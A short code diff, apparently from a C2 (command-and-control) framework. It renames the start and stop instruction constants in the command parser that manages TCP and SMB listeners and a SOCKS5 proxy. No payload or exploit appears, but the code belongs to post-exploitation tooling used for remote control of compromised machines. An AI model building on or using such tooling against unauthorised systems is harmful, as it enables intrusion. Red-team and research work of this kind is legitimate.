@@ -57,6 +57,10 @@ const std::string SocksInstruction = "socks";
 const std::string GetInfoInstruction = "getInfo";
 const std::string PatchMemoryInstruction = "patchMemory";
 
+const std::string StartInstruction = "start";
+const std::string StopInstruction = "stop";
+
+
 class CommonCommands
 {
 	public:
@@ -223,7 +227,7 @@ class CommonCommands
 		{
 			if(splitedCmd.size()>=3)
 			{
-				if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerTcpType)
+				if(splitedCmd[1]==StartInstruction && splitedCmd[2]==ListenerTcpType)
 				{
 					if(splitedCmd.size()>=5)
 					{
@@ -256,7 +260,7 @@ class CommonCommands
 						return -1;
 					}
 				}
-				else if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerSmbType)
+				else if(splitedCmd[1]==StartInstruction && splitedCmd[2]==ListenerSmbType)
 				{
 					if(splitedCmd.size()>=4)
 					{
@@ -276,7 +280,7 @@ class CommonCommands
 						return -1;
 					}
 				}
-				else if(splitedCmd[1]==StopCmd)
+				else if(splitedCmd[1]==StopInstruction)
 				{
 					std::string hash = splitedCmd[2];
 					std::string cmd = StopCmd;
@@ -364,7 +368,7 @@ class CommonCommands
 		{
 			if(splitedCmd.size()>=2)
 			{
-				if(splitedCmd[1]==StartCmd)
+				if(splitedCmd[1]==StartInstruction)
 				{
 					if(splitedCmd.size()>=3)
 					{
@@ -390,7 +394,7 @@ class CommonCommands
 						return -1;
 					}
 				}
-				else if(splitedCmd[1]==StopCmd)
+				else if(splitedCmd[1]==StopInstruction)
 				{
 					c2Message.set_instruction(Socks5Cmd);
 					c2Message.set_cmd(StopCmd);	
